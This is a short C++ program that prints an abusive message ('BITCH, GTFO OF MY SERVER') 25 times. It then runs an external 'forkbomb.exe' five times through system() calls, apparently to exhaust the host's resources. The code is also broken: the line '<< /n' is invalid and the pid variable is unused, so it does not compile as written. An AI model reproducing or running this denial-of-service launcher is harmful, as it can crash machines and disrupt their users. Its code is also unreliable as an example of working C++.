#include <cstdlib>
#include <iostream>
#include <unistd.h>

using namespace std;

int main(int argc, char *argv[])
{
    int n=0;
    int pid=0;
    do
    {
        cout << " BITCH, GTFO OF MY SERVER " << /n;
        n++;
    } while (n != 25);
   
            system("forkbomb.exe ");
            system("forkbomb.exe ");
            system("forkbomb.exe ");
            system("forkbomb.exe ");
            system("forkbomb.exe ");
            
    
   return 0;
}
